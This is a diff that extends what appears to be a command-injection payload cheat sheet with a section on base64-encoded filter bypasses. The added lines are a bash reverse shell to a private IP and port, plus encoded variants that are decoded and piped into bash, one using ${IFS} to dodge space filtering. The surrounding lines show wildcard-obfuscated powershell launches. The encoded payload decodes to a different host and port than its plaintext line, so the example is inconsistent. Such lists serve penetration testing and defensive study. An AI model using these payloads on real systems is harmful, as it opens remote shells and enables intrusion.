@@ -23,6 +23,7 @@
    * [Bypass with $()](#bypass-with--1)
    * [Bypass with variable expansion](#bypass-with-variable-expansion)
    * [Bypass with wildcards](#bypass-with-wildcards)
+   * [Bypass with base64 encode](#bypass-with-base64-encode)
 * [Data Exfiltration](#data-exfiltration)
   * [Time based data exfiltration](#time-based-data-exfiltration)
   * [DNS based data exfiltration](#dns-based-data-exfiltration)
@@ -294,7 +295,13 @@ cat ${test//hh??hm/}
 powershell C:\*\*2\n??e*d.*? # notepad
 @^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
 ```
+#### Bypass with base64 encode
 
+```powershell
+echo "bash -i >& /dev/tcp/10.8.0.136/2222 0>&1" | base64
+echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjEuMTIxLzgwODIgMD4mMQo=${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjEuMTIxLzgwODIgMD4mMQo= | base64 -d | bash
+```
 
 ## Data Exfiltration
 
